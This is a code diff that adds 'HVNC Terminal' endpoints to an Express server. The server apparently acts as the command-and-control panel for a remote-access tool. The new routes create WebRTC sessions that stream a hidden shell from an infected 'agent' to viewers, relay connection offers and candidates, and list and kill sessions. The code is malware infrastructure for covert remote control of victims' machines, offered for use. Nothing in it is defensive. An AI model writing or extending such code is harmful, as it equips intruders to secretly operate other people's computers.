@@ -2171,6 +2171,203 @@ app.get('/api/debug/headers', (req, res) => {
 
 
 
+
+
+// ─── HVNC TERMINAL ENDPOINTS ──────────────────────────────────────
+
+// Create Terminal WebRTC session
+app.get('/api/hvnc_terminal/stream/:agentId', verifyToken, (req, res) => {
+    const { agentId } = req.params;
+    console.log(`[HVNC Terminal] 📱 Stream request for agent: ${agentId}`);
+
+    const sessionId = `terminal_${agentId}_${Date.now()}_${Math.random().toString(36).substr(2, 6)}`;
+    const session = createWebRTCSession(sessionId, agentId);
+
+    session.hvnc = {
+        type: 'terminal',
+        shell: (req.query.shell || 'cmd').toLowerCase(),
+        width: parseInt(req.query.width) || 1280,
+        height: parseInt(req.query.height) || 800,
+        fps: parseInt(req.query.fps) || 10,
+        bitrate: parseInt(req.query.bitrate) || 2500,
+        scale_factor: parseFloat(req.query.scale_factor) || 0.6
+    };
+
+    console.log(`[HVNC Terminal] 📱 Session created: ${sessionId} for agent ${agentId} (shell=${session.hvnc.shell})`);
+
+    res.json({
+        success: true,
+        sessionId,
+        signalingUrl: (() => {
+            const host = req.hostname;
+            const isLocal = host === 'localhost' || host === '127.0.0.1'
+                         || host.startsWith('192.168.') || host.startsWith('10.');
+            return isLocal
+                ? `ws://${host}:8082`
+                : `${req.protocol === 'https' ? 'wss' : 'ws'}://${req.get('host')}/ws`;
+        })(),
+        iceServers: getIceServers(),
+        message: 'Use this sessionId to connect to the stream',
+        agentConnected: !!getAgentSocket(agentId)
+    });
+});
+
+// Agent sends SDP offer
+app.post('/api/hvnc_terminal/agent/offer', verifyToken, (req, res) => {
+    const { sessionId, sdp } = req.body;
+    if (!sessionId || !sdp) {
+        return res.status(400).json({ success: false, message: 'Missing sessionId or sdp' });
+    }
+    const session = getWebRTCSession(sessionId);
+    if (!session) {
+        return res.status(404).json({ success: false, message: 'Session not found' });
+    }
+    session.offer = sdp;
+    session.connected = true;
+
+    let forwardedCount = 0;
+    for (const viewer of session.viewers) {
+        if (viewer.readyState === WebSocket.OPEN) {
+            viewer.send(JSON.stringify({ type: 'offer', sdp, sessionId }));
+            forwardedCount++;
+        }
+    }
+    console.log(`[HVNC Terminal] 📤 Offer for ${sessionId} forwarded to ${forwardedCount} viewers`);
+    res.json({ success: true, message: 'Offer received and forwarded', forwardedTo: forwardedCount, sessionId });
+});
+
+// Agent polls for viewer SDP answer
+app.get('/api/hvnc_terminal/agent/answer/:sessionId', verifyToken, (req, res) => {
+    const { sessionId } = req.params;
+    const session = getWebRTCSession(sessionId);
+    if (!session) return res.status(404).json({ success: false, message: 'Session not found' });
+
+    if (session.pendingAnswer) {
+        const answer = session.pendingAnswer;
+        session.pendingAnswer = null;
+        return res.json({ success: true, sdp: answer });
+    }
+    if (session.answer) {
+        const answer = session.answer;
+        session.answer = null;
+        return res.json({ success: true, sdp: answer });
+    }
+    res.json({ success: false, message: 'No answer yet' });
+});
+
+// Agent sends ICE candidate -> forward to viewers
+app.post('/api/hvnc_terminal/agent/ice', verifyToken, (req, res) => {
+    const { sessionId, candidate } = req.body;
+    if (!sessionId || !candidate) {
+        return res.status(400).json({ success: false, message: 'Missing sessionId or candidate' });
+    }
+    const session = getWebRTCSession(sessionId);
+    if (!session) return res.status(404).json({ success: false, message: 'Session not found' });
+
+    let forwarded = 0;
+    for (const viewer of session.viewers) {
+        if (viewer.readyState === WebSocket.OPEN) {
+            viewer.send(JSON.stringify({ type: 'ice_candidate', candidate, sessionId }));
+            forwarded++;
+        }
+    }
+    res.json({ success: true, forwarded });
+});
+
+// Agent polls for viewer ICE candidates
+app.get('/api/hvnc_terminal/agent/candidates/:sessionId', verifyToken, (req, res) => {
+    const { sessionId } = req.params;
+    const session = getWebRTCSession(sessionId);
+    if (!session) return res.status(404).json({ success: false, message: 'Session not found' });
+
+    const candidates = session.viewerIceCandidates || [];
+    session.viewerIceCandidates = [];
+    res.json({ success: true, candidates, count: candidates.length });
+});
+
+// Kill all terminal sessions
+app.post('/api/hvnc_terminal/killall', verifyToken, (req, res) => {
+    console.log('[HVNC Terminal] 💀 KILLALL called');
+    let killed = 0;
+    const toDelete = [];
+    for (const [sessionId, session] of webrtcSessions) {
+        if (session.hvnc && session.hvnc.type === 'terminal') {
+            for (const viewer of session.viewers) {
+                try {
+                    if (viewer.readyState === WebSocket.OPEN) {
+                        viewer.close(1000, 'Killswitch activated');
+                    }
+                } catch (e) {}
+            }
+            killed++;
+            toDelete.push(sessionId);
+        }
+    }
+    for (const sessionId of toDelete) deleteWebRTCSession(sessionId);
+    console.log(`[HVNC Terminal] ✅ Killed ${killed} terminal session(s)`);
+    res.json({ success: true, killed, message: `Terminated ${killed} HVNC Terminal session(s)` });
+});
+
+// Terminal session status
+app.get('/api/hvnc_terminal/status/:sessionId', verifyToken, (req, res) => {
+    const { sessionId } = req.params;
+    const session = getWebRTCSession(sessionId);
+    if (!session) return res.status(404).json({ success: false, message: 'Session not found' });
+    if (!session.hvnc || session.hvnc.type !== 'terminal') {
+        return res.status(404).json({ success: false, message: 'Not a Terminal session' });
+    }
+    res.json({
+        success: true,
+        sessionId,
+        agentId: session.agentId,
+        viewers: session.viewers.size,
+        connected: session.connected,
+        hasOffer: !!session.offer,
+        hasAnswer: !!session.answer,
+        hvnc: session.hvnc,
+        created: session.created
+    });
+});
+
+// List terminal sessions
+app.get('/api/hvnc_terminal/sessions', verifyToken, (req, res) => {
+    const sessions = [];
+    for (const [sessionId, session] of webrtcSessions) {
+        if (session.hvnc && session.hvnc.type === 'terminal') {
+            sessions.push({
+                sessionId,
+                agentId: session.agentId,
+                viewers: session.viewers.size,
+                connected: session.connected,
+                hvnc: session.hvnc,
+                created: session.created
+            });
+        }
+    }
+    res.json({ success: true, total: sessions.length, sessions });
+});
+
+// Kill specific terminal session
+app.post('/api/hvnc_terminal/kill/:sessionId', verifyToken, (req, res) => {
+    const { sessionId } = req.params;
+    const session = getWebRTCSession(sessionId);
+    if (!session) return res.status(404).json({ success: false, message: 'Session not found' });
+    if (!session.hvnc || session.hvnc.type !== 'terminal') {
+        return res.status(404).json({ success: false, message: 'Not a Terminal session' });
+    }
+    for (const viewer of session.viewers) {
+        try {
+            if (viewer.readyState === WebSocket.OPEN) {
+                viewer.close(1000, 'Session terminated');
+            }
+        } catch (e) {}
+    }
+    deleteWebRTCSession(sessionId);
+    res.json({ success: true, message: `Terminal session ${sessionId} terminated` });
+});
+
+
+
 // ─── DOWNLOAD ENDPOINT ──────────────────────────────────────────
 
 
